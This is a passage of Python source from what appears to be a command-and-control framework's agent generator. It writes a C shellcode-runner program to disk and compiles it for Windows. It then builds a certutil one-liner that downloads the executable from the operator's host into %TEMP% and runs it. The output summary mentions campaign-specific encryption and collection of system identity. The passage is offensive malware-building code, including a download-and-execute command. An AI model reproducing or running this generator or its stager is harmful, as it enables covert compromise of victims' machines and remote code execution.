            // Error handling
            if (key) free(key);
            return 1;
        }}
        
        // Execute shellcode logic in a loop
        while (1) {{
            executeShellcode();
        }}
        
        // Cleanup (never reached in this case)
        free(key);
        return 0;
    }}
    """
    
    # Save the C file
    c_file_path = os.path.join(agents_folder, "shellcode_x86.c")
    with open(c_file_path, "w") as f:
        f.write(c_code)
    
    # Compile the shellcode if system has a C compiler
    exe_path = os.path.join(agents_folder, "shellcode_x86.exe")
    compile_result = "Shellcode C file generated. Compilation "
    
    try:
        if platform.system() == "Windows":
            compiler_command = f"cl {c_file_path} /Fe:{exe_path} /O2 /link rpcrt4.lib"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += f"failed: {compilation.stderr}"
        else:
            # For cross-compilation on non-Windows platforms
            compiler_command = f"i686-w64-mingw32-gcc {c_file_path} -o {exe_path} -lwininet -lcrypt32 -lrpcrt4 -s -O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += "failed. You may need to install mingw-w64 for cross-compilation."
    except Exception as e:
        compile_result += f"failed: {str(e)}"
    
    # Generate a cmd command to download and execute the shellcode
    http = "https" if ssl else "http"
    cmd_payload = f"cmd.exe /c certutil -urlcache -split -f {http}://{host}:{port}/shellcode_x86.exe %TEMP%\\sc.exe && %TEMP%\\sc.exe"
    
    # Save full payload information
    result = f"CMD Shellcodex86 agent generated:\n\n1. C source saved to: {c_file_path}\n2. {compile_result}\n3. Execution command:\n{cmd_payload}\n4. Uses encryption with campaign-specific key\n5. Includes system identity collection and verification"
    with open(os.path.join(agents_folder, "cmd_shellcodex86.txt"), "w") as f:
        f.write(result)
    
    return result